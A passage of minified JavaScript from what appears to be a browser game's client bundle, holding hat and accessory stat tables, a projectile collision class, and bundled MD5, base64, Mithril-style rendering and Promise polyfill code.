        price: 3e3,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 6,
        name: "Soldier Helmet",
        price: 4e3,
        scale: 120,
        desc: "reduces damage taken but slows movement",
        spdMult: 0.94,
        dmgMult: 0.75,
    },
    {
        id: 23,
        name: "Anti Venom Gear",
        price: 4e3,
        scale: 120,
        desc: "makes you immune to poison",
        poisonRes: 1,
    },
    {
        id: 13,
        name: "Medic Gear",
        price: 5e3,
        scale: 110,
        desc: "slowly regenerates health over time",
        healthRegen: 3,
    },
    {
        id: 9,
        name: "Miners Helmet",
        price: 5e3,
        scale: 120,
        desc: "earn 1 extra gold per resource",
        extraGold: 1,
    },
    {
        id: 32,
        name: "Musketeer Hat",
        price: 5e3,
        scale: 120,
        desc: "reduces cost of projectiles",
        projCost: 0.5,
    },
    {
        id: 7,
        name: "Bull Helmet",
        price: 6e3,
        scale: 120,
        desc: "increases damage done but drains health",
        healthRegen: -5,
        dmgMultO: 1.5,
        spdMult: 0.96,
    },
    {
        id: 22,
        name: "Emp Helmet",
        price: 6e3,
        scale: 120,
        desc: "turrets won't attack but you move slower",
        antiTurret: 1,
        spdMult: 0.7,
    },
    {
        id: 12,
        name: "Booster Hat",
        price: 6e3,
        scale: 120,
        desc: "increases your movement speed",
        spdMult: 1.16,
    },
    {
        id: 26,
        name: "Barbarian Armor",
        price: 8e3,
        scale: 120,
        desc: "knocks back enemies that attack you",
        dmgK: 0.6,
    },
    {
        id: 21,
        name: "Plague Mask",
        price: 1e4,
        scale: 120,
        desc: "melee attacks deal poison damage",
        poisonDmg: 5,
        poisonTime: 6,
    },
    {
        id: 46,
        name: "Bull Mask",
        price: 1e4,
        scale: 120,
        desc: "bulls won't target you unless you attack them",
        bullRepel: 1,
    },
    {
        id: 14,
        name: "Windmill Hat",
        topSprite: !0,
        price: 1e4,
        scale: 120,
        desc: "generates points while worn",
        pps: 1.5,
    },
    {
        id: 11,
        name: "Spike Gear",
        topSprite: !0,
        price: 1e4,
        scale: 120,
        desc: "deal damage to players that damage you",
        dmg: 0.45,
    },
    {
        id: 53,
        name: "Turret Gear",
        topSprite: !0,
        price: 1e4,
        scale: 120,
        desc: "you become a walking turret",
        turret: {
            proj: 1,
            range: 700,
            rate: 2500,
        },
        spdMult: 0.7,
    },
    {
        id: 20,
        name: "Samurai Armor",
        price: 12e3,
        scale: 120,
        desc: "increased attack speed and fire rate",
        atkSpd: 0.78,
    },
    {
        id: 58,
        name: "Dark Knight",
        price: 12e3,
        scale: 120,
        desc: "restores health when you deal damage",
        healD: 0.4,
    },
    {
        id: 27,
        name: "Scavenger Gear",
        price: 15e3,
        scale: 120,
        desc: "earn double points for each kill",
        kScrM: 2,
    },
    {
        id: 40,
        name: "Tank Gear",
        price: 15e3,
        scale: 120,
        desc: "increased damage to buildings but slower movement",
        spdMult: 0.3,
        bDmg: 3.3,
    },
    {
        id: 52,
        name: "Thief Gear",
        price: 15e3,
        scale: 120,
        desc: "steal half of a players gold when you kill them",
        goldSteal: 0.5,
    },
    {
        id: 55,
        name: "Bloodthirster",
        price: 2e4,
        scale: 120,
        desc: "Restore Health when dealing damage. And increased damage",
        healD: 0.25,
        dmgMultO: 1.2,
    },
    {
        id: 56,
        name: "Assassin Gear",
        price: 2e4,
        scale: 120,
        desc: "Go invisible when not moving. Can't eat. Increased speed",
        noEat: !0,
        spdMult: 1.1,
        invisTimer: 1e3,
    },
],
      zc = [
          {
              id: 12,
              name: "Snowball",
              price: 1e3,
              scale: 105,
              xOff: 18,
              desc: "no effect",
          },
          {
              id: 9,
              name: "Tree Cape",
              price: 1e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 10,
              name: "Stone Cape",
              price: 1e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 3,
              name: "Cookie Cape",
              price: 1500,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 8,
              name: "Cow Cape",
              price: 2e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 11,
              name: "Monkey Tail",
              price: 2e3,
              scale: 97,
              xOff: 25,
              desc: "Super speed but reduced damage",
              spdMult: 1.35,
              dmgMultO: 0.2,
          },
          {
              id: 17,
              name: "Apple Basket",
              price: 3e3,
              scale: 80,
              xOff: 12,
              desc: "slowly regenerates health over time",
              healthRegen: 1,
          },
          {
              id: 6,
              name: "Winter Cape",
              price: 3e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 4,
              name: "Skull Cape",
              price: 4e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 5,
              name: "Dash Cape",
              price: 5e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 2,
              name: "Dragon Cape",
              price: 6e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 1,
              name: "Super Cape",
              price: 8e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 7,
              name: "Troll Cape",
              price: 8e3,
              scale: 90,
              desc: "no effect",
          },
          {
              id: 14,
              name: "Thorns",
              price: 1e4,
              scale: 115,
              xOff: 20,
              desc: "no effect",
          },
          {
              id: 15,
              name: "Blockades",
              price: 1e4,
              scale: 95,
              xOff: 15,
              desc: "no effect",
          },
          {
              id: 20,
              name: "Devils Tail",
              price: 1e4,
              scale: 95,
              xOff: 20,
              desc: "no effect",
          },
          {
              id: 16,
              name: "Sawblade",
              price: 12e3,
              scale: 90,
              spin: !0,
              xOff: 0,
              desc: "deal damage to players that damage you",
              dmg: 0.15,
          },
          {
              id: 13,
              name: "Angel Wings",
              price: 15e3,
              scale: 138,
              xOff: 22,
              desc: "slowly regenerates health over time",
              healthRegen: 3,
          },
          {
              id: 19,
              name: "Shadow Wings",
              price: 15e3,
              scale: 138,
              xOff: 22,
              desc: "increased movement speed",
              spdMult: 1.1,
          },
          {
              id: 18,
              name: "Blood Wings",
              price: 2e4,
              scale: 178,
              xOff: 26,
              desc: "restores health when you deal damage",
              healD: 0.2,
          },
          {
              id: 21,
              name: "Corrupt X Wings",
              price: 2e4,
              scale: 178,
              xOff: 26,
              desc: "deal damage to players that damage you",
              dmg: 0.25,
          },
      ],
      $r = {
          hats: Bc,
          accessories: zc,
      };

function Hc(t, n, i, o, a, r, s) {
    this.init = function (t, n, i, o, a, r, l, c, d) {
        (this.active = !0),
            (this.indx = t),
            (this.x = n),
            (this.y = i),
            (this.dir = o),
            (this.skipMov = !0),
            (this.speed = a),
            (this.dmg = r),
            (this.scale = c),
            (this.range = l),
            (this.owner = d),
            s && (this.sentTo = {});
    };
    let l = [],
        c;
    this.update = function (d) {
        if (this.active) {
            let h = this.speed * d,
                u;
            if (
                (this.skipMov
                 ? (this.skipMov = !1)
                 : ((this.x += h * Math.cos(this.dir)),
                    (this.y += h * Math.sin(this.dir)),
                    (this.range -= h),
                    this.range <= 0 &&
                    ((this.x += this.range * Math.cos(this.dir)),
                     (this.y += this.range * Math.sin(this.dir)),
                     (h = 1),
                     (this.range = 0),
                     (this.active = !1))),
                 s)
            ) {
                for (var p = 0; p < t.length; ++p)
                    !this.sentTo[t[p].id] &&
                        t[p].canSee(this) &&
                        ((this.sentTo[t[p].id] = 1),
                         s.send(
                        t[p].id,
                        "X",
                        r.fixTo(this.x, 1),
                        r.fixTo(this.y, 1),
                        r.fixTo(this.dir, 2),
                        r.fixTo(this.range, 1),
                        this.speed,
                        this.indx,
                        this.layer,
                        this.sid
                    ));
                l.length = 0;
                for (var p = 0; p < t.length + n.length; ++p)
                    (c = t[p] || n[p - t.length]).alive &&
                        c != this.owner &&
                        !(this.owner.team && c.team == this.owner.team) &&
                        r.lineInRect(
                        c.x - c.scale,
                        c.y - c.scale,
                        c.x + c.scale,
                        c.y + c.scale,
                        this.x,
                        this.y,
                        this.x + h * Math.cos(this.dir),
                        this.y + h * Math.sin(this.dir)
                    ) &&
                        l.push(c);
                let f = i.getGridArrays(this.x, this.y, this.scale);
                for (let $ = 0; $ < f.length; ++$)
                    for (let g = 0; g < f[$].length; ++g)
                        (u = (c = f[$][g]).getScale()),
                            c.active &&
                            this.ignoreObj != c.sid &&
                            this.layer <= c.layer &&
                            0 > l.indexOf(c) &&
                            !c.ignoreCollision &&
                            r.lineInRect(
                            c.x - u,
                            c.y - u,
                            c.x + u,
                            c.y + u,
                            this.x,
                            this.y,
                            this.x + h * Math.cos(this.dir),
                            this.y + h * Math.sin(this.dir)
                        ) &&
                            l.push(c);
                if (l.length > 0) {
                    let m = null,
                        _ = null,
                        k = null;
                    for (var p = 0; p < l.length; ++p)
                        (k = r.getDistance(this.x, this.y, l[p].x, l[p].y)),
                            (null == _ || k < _) && ((_ = k), (m = l[p]));
                    if (m.isPlayer || m.isAI) {
                        let v = 0.3 * (m.weightM || 1);
                        (m.xVel += v * Math.cos(this.dir)),
                            (m.yVel += v * Math.sin(this.dir)),
                            (null != m.weaponIndex &&
                             o.weapons[m.weaponIndex].shield &&
                             r.getAngleDist(this.dir + Math.PI, m.dir) <= a.shieldAngle) ||
                            m.changeHealth(-this.dmg, this.owner, this.owner);
                    } else {
                        m.projDmg &&
                            m.health &&
                            m.changeHealth(-this.dmg) &&
                            i.disableObj(m);
                        for (var p = 0; p < t.length; ++p)
                            t[p].active &&
                                (m.sentTo[t[p].id] &&
                                 (m.active
                                  ? t[p].canSee(m) &&
                                  s.send(t[p].id, "L", r.fixTo(this.dir, 2), m.sid)
                                  : s.send(t[p].id, "Q", m.sid)),
                                 m.active ||
                                 m.owner != t[p] ||
                                 t[p].changeItemCount(m.group.id, -1));
                    }
                    this.active = !1;
                    for (var p = 0; p < t.length; ++p)
                        this.sentTo[t[p].id] &&
                            s.send(t[p].id, "Y", this.sid, r.fixTo(_, 1));
                }
            }
        }
    };
}
var On = {},
    Fc = {
        get exports() {
            return On;
        },
        set exports(e) {
            On = e;
        },
    },
    Rn = {},
    Vc = {
        get exports() {
            return Rn;
        },
        set exports(e) {
            Rn = e;
        },
    };
!(function () {
    var t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        n = {
            rotl: function (t, n) {
                return (t << n) | (t >>> (32 - n));
            },
            rotr: function (t, n) {
                return (t << (32 - n)) | (t >>> n);
            },
            endian: function (t) {
                if (t.constructor == Number)
                    return (16711935 & n.rotl(t, 8)) | (4278255360 & n.rotl(t, 24));
                for (var i = 0; i < t.length; i++) t[i] = n.endian(t[i]);
                return t;
            },
            randomBytes: function (t) {
                for (var n = []; t > 0; t--) n.push(Math.floor(256 * Math.random()));
                return n;
            },
            bytesToWords: function (t) {
                for (var n = [], i = 0, o = 0; i < t.length; i++, o += 8)
                    n[o >>> 5] |= t[i] << (24 - (o % 32));
                return n;
            },
            wordsToBytes: function (t) {
                for (var n = [], i = 0; i < 32 * t.length; i += 8)
                    n.push((t[i >>> 5] >>> (24 - (i % 32))) & 255);
                return n;
            },
            bytesToHex: function (t) {
                for (var n = [], i = 0; i < t.length; i++)
                    n.push((t[i] >>> 4).toString(16)), n.push((15 & t[i]).toString(16));
                return n.join("");
            },
            hexToBytes: function (t) {
                for (var n = [], i = 0; i < t.length; i += 2)
                    n.push(parseInt(t.substr(i, 2), 16));
                return n;
            },
            bytesToBase64: function (n) {
                for (var i = [], o = 0; o < n.length; o += 3)
                    for (
                        var a = (n[o] << 16) | (n[o + 1] << 8) | n[o + 2], r = 0;
                        r < 4;
                        r++
                    )
                        8 * o + 6 * r <= 8 * n.length
                            ? i.push(t.charAt((a >>> (6 * (3 - r))) & 63))
                        : i.push("=");
                return i.join("");
            },
            base64ToBytes: function (n) {
                n = n.replace(/[^A-Z0-9+\/]/gi, "");
                for (var i = [], o = 0, a = 0; o < n.length; a = ++o % 4)
                    0 != a &&
                        i.push(
                        ((t.indexOf(n.charAt(o - 1)) & (Math.pow(2, -2 * a + 8) - 1)) <<
                         (2 * a)) |
                        (t.indexOf(n.charAt(o)) >>> (6 - 2 * a))
                    );
                return i;
            },
        };
    Vc.exports = n;
})();
var _n = {
    utf8: {
        stringToBytes: function (t) {
            return _n.bin.stringToBytes(unescape(encodeURIComponent(t)));
        },
        bytesToString: function (t) {
            return decodeURIComponent(escape(_n.bin.bytesToString(t)));
        },
    },
    bin: {
        stringToBytes: function (t) {
            for (var n = [], i = 0; i < t.length; i++)
                n.push(255 & t.charCodeAt(i));
            return n;
        },
        bytesToString: function (t) {
            for (var n = [], i = 0; i < t.length; i++)
                n.push(String.fromCharCode(t[i]));
            return n.join("");
        },
    },
},
    zs = _n,
    Uc = function (t) {
        return null != t && (Kr(t) || Lc(t) || !!t._isBuffer);
    };

function Kr(t) {
    return (
        !!t.constructor &&
        "function" == typeof t.constructor.isBuffer &&
        t.constructor.isBuffer(t)
    );
}

function Lc(t) {
    return (
        "function" == typeof t.readFloatLE &&
        "function" == typeof t.slice &&
        Kr(t.slice(0, 0))
    );
}

function Ge() {
    if (Hs) return ji;

    function t(t, n, i, o, a, r) {
        return {
            tag: t,
            key: n,
            attrs: i,
            children: o,
            text: a,
            dom: r,
            domSize: void 0,
            state: void 0,
            events: void 0,
            instance: void 0,
        };
    }
    return (
        (Hs = 1),
        (t.normalize = function (n) {
            return Array.isArray(n)
                ? t("[", void 0, void 0, t.normalizeChildren(n), void 0, void 0)
            : null == n || "boolean" == typeof n
                ? null
            : "object" == typeof n
                ? n
            : t("#", void 0, void 0, String(n), void 0, void 0);
        }),
        (t.normalizeChildren = function (n) {
            var i = [];
            if (n.length) {
                for (var o = null != n[0] && null != n[0].key, a = 1; a < n.length; a++)
                    if ((null != n[a] && null != n[a].key) !== o)
                        throw TypeError(
                            o && (null != n[a] || "boolean" == typeof n[a])
                            ? "In fragments, vnodes must either all have keys or none have keys. You may wish to consider using an explicit keyed empty fragment, m.fragment({key: ...}), instead of a hole."
                            : "In fragments, vnodes must either all have keys or none have keys."
                        );
                for (var a = 0; a < n.length; a++) i[a] = t.normalize(n[a]);
            }
            return i;
        }),
        (ji = t)
    );
}
!(function () {
    var t = Rn,
        n = zs.utf8,
        i = Uc,
        o = zs.bin,
        a = function (r, s) {
            r.constructor == String
                ? (r =
                   s && "binary" === s.encoding
                   ? o.stringToBytes(r)
                   : n.stringToBytes(r))
            : i(r)
                ? (r = Array.prototype.slice.call(r, 0))
            : Array.isArray(r) ||
                r.constructor === Uint8Array ||
                (r = r.toString());
            for (
                var l = t.bytesToWords(r),
                c = 8 * r.length,
                d = 1732584193,
                h = -271733879,
                u = -1732584194,
                p = 271733878,
                f = 0;
                f < l.length;
                f++
            )
                l[f] =
                    (((l[f] << 8) | (l[f] >>> 24)) & 16711935) |
                    (((l[f] << 24) | (l[f] >>> 8)) & 4278255360);
            (l[c >>> 5] |= 128 << c % 32), (l[(((c + 64) >>> 9) << 4) + 14] = c);
            for (
                var $ = a._ff, g = a._gg, m = a._hh, _ = a._ii, f = 0;
                f < l.length;
                f += 16
            ) {
                var k = d,
                    v = h,
                    b = u,
                    w = p;
                (d = $(d, h, u, p, l[f + 0], 7, -680876936)),
                    (p = $(p, d, h, u, l[f + 1], 12, -389564586)),
                    (u = $(u, p, d, h, l[f + 2], 17, 606105819)),
                    (h = $(h, u, p, d, l[f + 3], 22, -1044525330)),
                    (d = $(d, h, u, p, l[f + 4], 7, -176418897)),
                    (p = $(p, d, h, u, l[f + 5], 12, 1200080426)),
                    (u = $(u, p, d, h, l[f + 6], 17, -1473231341)),
                    (h = $(h, u, p, d, l[f + 7], 22, -45705983)),
                    (d = $(d, h, u, p, l[f + 8], 7, 1770035416)),
                    (p = $(p, d, h, u, l[f + 9], 12, -1958414417)),
                    (u = $(u, p, d, h, l[f + 10], 17, -42063)),
                    (h = $(h, u, p, d, l[f + 11], 22, -1990404162)),
                    (d = $(d, h, u, p, l[f + 12], 7, 1804603682)),
                    (p = $(p, d, h, u, l[f + 13], 12, -40341101)),
                    (u = $(u, p, d, h, l[f + 14], 17, -1502002290)),
                    (h = $(h, u, p, d, l[f + 15], 22, 1236535329)),
                    (d = g(d, h, u, p, l[f + 1], 5, -165796510)),
                    (p = g(p, d, h, u, l[f + 6], 9, -1069501632)),
                    (u = g(u, p, d, h, l[f + 11], 14, 643717713)),
                    (h = g(h, u, p, d, l[f + 0], 20, -373897302)),
                    (d = g(d, h, u, p, l[f + 5], 5, -701558691)),
                    (p = g(p, d, h, u, l[f + 10], 9, 38016083)),
                    (u = g(u, p, d, h, l[f + 15], 14, -660478335)),
                    (h = g(h, u, p, d, l[f + 4], 20, -405537848)),
                    (d = g(d, h, u, p, l[f + 9], 5, 568446438)),
                    (p = g(p, d, h, u, l[f + 14], 9, -1019803690)),
                    (u = g(u, p, d, h, l[f + 3], 14, -187363961)),
                    (h = g(h, u, p, d, l[f + 8], 20, 1163531501)),
                    (d = g(d, h, u, p, l[f + 13], 5, -1444681467)),
                    (p = g(p, d, h, u, l[f + 2], 9, -51403784)),
                    (u = g(u, p, d, h, l[f + 7], 14, 1735328473)),
                    (h = g(h, u, p, d, l[f + 12], 20, -1926607734)),
                    (d = m(d, h, u, p, l[f + 5], 4, -378558)),
                    (p = m(p, d, h, u, l[f + 8], 11, -2022574463)),
                    (u = m(u, p, d, h, l[f + 11], 16, 1839030562)),
                    (h = m(h, u, p, d, l[f + 14], 23, -35309556)),
                    (d = m(d, h, u, p, l[f + 1], 4, -1530992060)),
                    (p = m(p, d, h, u, l[f + 4], 11, 1272893353)),
                    (u = m(u, p, d, h, l[f + 7], 16, -155497632)),
                    (h = m(h, u, p, d, l[f + 10], 23, -1094730640)),
                    (d = m(d, h, u, p, l[f + 13], 4, 681279174)),
                    (p = m(p, d, h, u, l[f + 0], 11, -358537222)),
                    (u = m(u, p, d, h, l[f + 3], 16, -722521979)),
                    (h = m(h, u, p, d, l[f + 6], 23, 76029189)),
                    (d = m(d, h, u, p, l[f + 9], 4, -640364487)),
                    (p = m(p, d, h, u, l[f + 12], 11, -421815835)),
                    (u = m(u, p, d, h, l[f + 15], 16, 530742520)),
                    (h = m(h, u, p, d, l[f + 2], 23, -995338651)),
                    (d = _(d, h, u, p, l[f + 0], 6, -198630844)),
                    (p = _(p, d, h, u, l[f + 7], 10, 1126891415)),
                    (u = _(u, p, d, h, l[f + 14], 15, -1416354905)),
                    (h = _(h, u, p, d, l[f + 5], 21, -57434055)),
                    (d = _(d, h, u, p, l[f + 12], 6, 1700485571)),
                    (p = _(p, d, h, u, l[f + 3], 10, -1894986606)),
                    (u = _(u, p, d, h, l[f + 10], 15, -1051523)),
                    (h = _(h, u, p, d, l[f + 1], 21, -2054922799)),
                    (d = _(d, h, u, p, l[f + 8], 6, 1873313359)),
                    (p = _(p, d, h, u, l[f + 15], 10, -30611744)),
                    (u = _(u, p, d, h, l[f + 6], 15, -1560198380)),
                    (h = _(h, u, p, d, l[f + 13], 21, 1309151649)),
                    (d = _(d, h, u, p, l[f + 4], 6, -145523070)),
                    (p = _(p, d, h, u, l[f + 11], 10, -1120210379)),
                    (u = _(u, p, d, h, l[f + 2], 15, 718787259)),
                    (h = _(h, u, p, d, l[f + 9], 21, -343485551)),
                    (d = (d + k) >>> 0),
                    (h = (h + v) >>> 0),
                    (u = (u + b) >>> 0),
                    (p = (p + w) >>> 0);
            }
            return t.endian([d, h, u, p]);
        };
    (a._ff = function (t, n, i, o, a, r, s) {
        var l = t + ((n & i) | (~n & o)) + (a >>> 0) + s;
        return ((l << r) | (l >>> (32 - r))) + n;
    }),
        (a._gg = function (t, n, i, o, a, r, s) {
        var l = t + ((n & o) | (i & ~o)) + (a >>> 0) + s;
        return ((l << r) | (l >>> (32 - r))) + n;
    }),
        (a._hh = function (t, n, i, o, a, r, s) {
        var l = t + (n ^ i ^ o) + (a >>> 0) + s;
        return ((l << r) | (l >>> (32 - r))) + n;
    }),
        (a._ii = function (t, n, i, o, a, r, s) {
        var l = t + (i ^ (n | ~o)) + (a >>> 0) + s;
        return ((l << r) | (l >>> (32 - r))) + n;
    }),
        (a._blocksize = 16),
        (a._digestsize = 16),
        (Fc.exports = function (n, i) {
        if (null == n) throw Error("Illegal argument " + n);
        var r = t.wordsToBytes(a(n, i));
        return i && i.asBytes
            ? r
        : i && i.asString
            ? o.bytesToString(r)
        : t.bytesToHex(r);
    });
})();
var Nc = Ge(),
    Jr = function () {
        var t,
            n = arguments[this],
            i = this + 1;
        if (
            (null == n
             ? (n = {})
             : ("object" != typeof n || null != n.tag || Array.isArray(n)) &&
             ((n = {}), (i = this)),
             arguments.length === i + 1)
        )
            (t = arguments[i]), Array.isArray(t) || (t = [t]);
        else for (t = []; i < arguments.length; ) t.push(arguments[i++]);
        return Nc("", n.key, n, t);
    },
    Ci = {}.hasOwnProperty,
    qc = Ge(),
    Wc = Jr,
    pt = Ci,
    Xc =
    /(?:(^|#|\.)([^#\.\[\]]+))|(\[(.+?)(?:\s*=\s*("|'|)((?:\\["'\]]|.)*?)\5)?\])/g,
    Qr = {};

function Fs(t) {
    for (var n in t) if (pt.call(t, n)) return !1;
    return !0;
}

function Gc(t) {
    for (var n, i = "div", o = [], a = {}; (n = Xc.exec(t)); ) {
        var r = n[1],
            s = n[2];
        if ("" === r && "" !== s) i = s;
        else if ("#" === r) a.id = s;
        else if ("." === r) o.push(s);
        else if ("[" === n[3][0]) {
            var l = n[6];
            l && (l = l.replace(/\\(["'])/g, "$1").replace(/\\\\/g, "\\")),
                "class" === n[4] ? o.push(l) : (a[n[4]] = "" === l ? l : l || !0);
        }
    }
    return (
        o.length > 0 && (a.className = o.join(" ")),
        (Qr[t] = {
            tag: i,
            attrs: a,
        })
    );
}

function Yc(t, n) {
    var i = n.attrs,
        o = pt.call(i, "class"),
        a = o ? i.class : i.className;
    if (((n.tag = t.tag), (n.attrs = {}), !Fs(t.attrs) && !Fs(i))) {
        var r = {};
        for (var s in i) pt.call(i, s) && (r[s] = i[s]);
        i = r;
    }
    for (var s in t.attrs)
        pt.call(t.attrs, s) &&
            "className" !== s &&
            !pt.call(i, s) &&
            (i[s] = t.attrs[s]);
    for (var s in ((null != a || null != t.attrs.className) &&
                   (i.className =
                    null != a
                    ? null != t.attrs.className
                    ? String(t.attrs.className) + " " + String(a)
                    : a
                    : null != t.attrs.className
                    ? t.attrs.className
                    : null),
                   o && (i.class = null),
                   i))
        if (pt.call(i, s) && "key" !== s) {
            n.attrs = i;
            break;
        }
    return n;
}

function $c(t) {
    if (
        null == t ||
        ("string" != typeof t &&
         "function" != typeof t &&
         "function" != typeof t.view)
    )
        throw Error("The selector must be either a string or a component.");
    var n = Wc.apply(1, arguments);
    return "string" == typeof t &&
        ((n.children = qc.normalizeChildren(n.children)), "[" !== t)
        ? Yc(Qr[t] || Gc(t), n)
    : ((n.tag = t), n);
}
var Zr = $c,
    Kc = Ge(),
    Jc = function (t) {
        return null == t && (t = ""), Kc("<", void 0, void 0, t, void 0, void 0);
    },
    Qc = Ge(),
    Zc = Jr,
    jc = function () {
        var t = Zc.apply(0, arguments);
        return (t.tag = "["), (t.children = Qc.normalizeChildren(t.children)), t;
    },
    ns = Zr;
(ns.trust = Jc), (ns.fragment = jc);
var ji,
    Hs,
    tn,
    Vs,
    eh = ns,
    yi = {},
    en = {
        get exports() {
            return yi;
        },
        set exports(e) {
            yi = e;
        },
    };

function jr() {
    if (Vs) return tn;
    Vs = 1;
    var t = function (n) {
        if (!(this instanceof t)) throw Error("Promise must be called with 'new'.");
        if ("function" != typeof n) throw TypeError("executor must be a function.");
        var i = this,
            o = [],
            a = [],
            r = d(o, !0),
            s = d(a, !1),
            l = (i._instance = {
                resolvers: o,
                rejectors: a,
            }),
            c = "function" == typeof setImmediate ? setImmediate : setTimeout;

        function d(t, n) {
            return function r(d) {
                var u;
                try {
                    if (
                        n &&
                        null != d &&
                        ("object" == typeof d || "function" == typeof d) &&
                        "function" == typeof (u = d.then)
                    ) {
                        if (d === i)
                            throw TypeError("Promise can't be resolved with itself.");
                        h(u.bind(d));
                    } else
                        c(function () {
                            n ||
                                0 !== t.length ||
                                console.error("Possible unhandled promise rejection:", d);
                            for (var i = 0; i < t.length; i++) t[i](d);
                            (o.length = 0),
                                (a.length = 0),
                                (l.state = n),
                                (l.retry = function () {
                                r(d);
                            });
                        });
                } catch (p) {
                    s(p);
                }
            };
        }

        function h(t) {
            var n = 0;

            function i(t) {
                return function (i) {
                    n++ > 0 || t(i);
                };
            }
            var o = i(s);
            try {
                t(i(r), o);
            } catch (a) {
                o(a);
            }
        }
        h(n);
    };
    return (
        (t.prototype.then = function (n, i) {
            var o = this._instance;

            function a(t, n, i, a) {
                n.push(function (n) {
                    if ("function" != typeof t) i(n);
                    else
                        try {
                            r(t(n));
                        } catch (o) {
                            s && s(o);
                        }
                }),
                    "function" == typeof o.retry && a === o.state && o.retry();
            }
            var r,
                s,
                l = new t(function (t, n) {
                    (r = t), (s = n);
                });
            return a(n, o.resolvers, r, !0), a(i, o.rejectors, s, !1), l;
        }),
        (t.prototype.catch = function (t) {
            return this.then(null, t);
        }),
        (t.prototype.finally = function (n) {
            return this.then(
                function (i) {
                    return t.resolve(n()).then(function () {
                        return i;
                    });
                },
                function (i) {
                    return t.resolve(n()).then(function () {
                        return t.reject(i);
                    });
                }
            );
        }),
        (t.resolve = function (n) {
            return n instanceof t
                ? n
            : new t(function (t) {
                t(n);
            });
        }),
        (t.reject = function (n) {
            return new t(function (t, i) {
                i(n);
            });
        }),
        (t.all = function (n) {
            return new t(function (t, i) {
                var o = n.length,
                    a = 0,
                    r = [];
                if (0 === n.length) t([]);
                else
                    for (var s = 0; s < n.length; s++)
                        (function (s) {
                            function l(n) {
                                a++, (r[s] = n), a === o && t(r);
                            }
                            null != n[s] &&
                                ("object" == typeof n[s] || "function" == typeof n[s]) &&
                                "function" == typeof n[s].then
                                ? n[s].then(l, i)
                            : l(n[s]);
                        })(s);
            });
        }),
        (t.race = function (n) {
            return new t(function (t, i) {
                for (var o = 0; o < n.length; o++) n[o].then(t, i);
            });
        }),
        (tn = t)
    );
}
var _t = jr();

function th() {
    if (Us) return nn;
    Us = 1;
    var t = Ge();
    return (nn = function (n) {
        var i,
            o,
            a = n && n.document,
            r = {
                svg: "http://www.w3.org/2000/svg",
                math: "http://www.w3.org/1998/Math/MathML",
            };

        function s(t) {
            return (t.attrs && t.attrs.xmlns) || r[t.tag];
        }

        function l(t, n) {
            if (t.state !== n) throw Error("'vnode.state' must not be modified.");
        }

        function c(t) {
            var n = t.state;
            try {
                return this.apply(n, arguments);
            } finally {
                l(t, n);
            }
        }

        function d() {
            try {
                return a.activeElement;
            } catch {
                return null;
            }
        }

        function h(t, n, i, o, a, r, s) {
            for (var l = i; l < o; l++) {
                var c = n[l];
                null != c && u(t, c, a, s, r);
            }
        }

        function u(n, i, o, r, l) {
            var d,
                p,
                $,
                g,
                m,
                _,
                k,
                v,
                x = i.tag;
            if ("string" == typeof x)
                switch (((i.state = {}), null != i.attrs && N(i.attrs, i, o), x)) {
                    case "#":
                        (d = n),
                            (p = i),
                            ($ = l),
                            (p.dom = a.createTextNode(p.children)),
                            b(d, p.dom, $);
                        break;
                    case "<":
                        f(n, i, r, l);
                        break;
                    case "[":
                        !(function t(n, i, o, r, s) {
                            var l = a.createDocumentFragment();
                            if (null != i.children) {
                                var c = i.children;
                                h(l, c, 0, c.length, o, null, r);
                            }
                            (i.dom = l.firstChild),
                                (i.domSize = l.childNodes.length),
                                b(n, l, s);
                        })(n, i, o, r, l);
                        break;
                    default:
                        !(function t(n, i, o, r, l) {
                            var c = i.tag,
                                d = i.attrs,
                                u = d && d.is,
                                p = (r = s(i) || r)
                            ? u
                            ? a.createElementNS(r, c, {
                                is: u,
                            })
                            : a.createElementNS(r, c)
                            : u
                            ? a.createElement(c, {
                                is: u,
                            })
                            : a.createElement(c);
                            if (
                                ((i.dom = p),
                                 null != d &&
                                 (function t(n, i, o) {
                                    "input" === n.tag &&
                                        null != i.type &&
                                        n.dom.setAttribute("type", i.type);
                                    var a = null != i && "input" === n.tag && "file" === i.type;
                                    for (var r in i) A(n, r, null, i[r], o, a);
                                })(i, d, r),
                                 b(n, p, l),
                                 !w(i) && null != i.children)
                            ) {
                                var f = i.children;
                                h(p, f, 0, f.length, o, null, r),
                                    "select" === i.tag &&
                                    null != d &&
                                    (function t(n, i) {
                                    if ("value" in i) {
                                        if (null === i.value)
                                            -1 !== n.dom.selectedIndex && (n.dom.value = null);
                                        else {
                                            var o = "" + i.value;
                                            (n.dom.value !== o || -1 === n.dom.selectedIndex) &&
                                                (n.dom.value = o);
                                        }
                                    }
                                    "selectedIndex" in i &&
                                        A(n, "selectedIndex", null, i.selectedIndex, void 0);
                                })(i, d);
                            }
                        })(n, i, o, r, l);
                }
            else {
                (g = n),
                    (m = i),
                    (_ = o),
                    (k = r),
                    (v = l),
                    (function n(i, o) {
                    var a;
                    if ("function" == typeof i.tag.view) {
                        if (
                            ((i.state = Object.create(i.tag)),
                             null != (a = i.state.view).$$reentrantLock$$)
                        )
                            return;
                        a.$$reentrantLock$$ = !0;
                    } else {
                        if (((i.state = void 0), null != (a = i.tag).$$reentrantLock$$))
                            return;
                        (a.$$reentrantLock$$ = !0),
                            (i.state =
                             null != i.tag.prototype &&
                             "function" == typeof i.tag.prototype.view
                             ? new i.tag(i)
                             : i.tag(i));
                    }
                    if (
                        (N(i.state, i, o),
                         null != i.attrs && N(i.attrs, i, o),
                         (i.instance = t.normalize(c.call(i.state.view, i))),
                         i.instance === i)
                    )
                        throw Error(
                            "A view cannot return the vnode it received as argument"
                        );
                    a.$$reentrantLock$$ = null;
                })(m, _),
                    null != m.instance
                    ? (u(g, m.instance, _, k, v),
                       (m.dom = m.instance.dom),
                       (m.domSize = null != m.dom ? m.instance.domSize : 0))
                : (m.domSize = 0);
            }
        }
        var p = {
            caption: "table",
            thead: "table",
            tbody: "table",
            tfoot: "table",
            tr: "tbody",
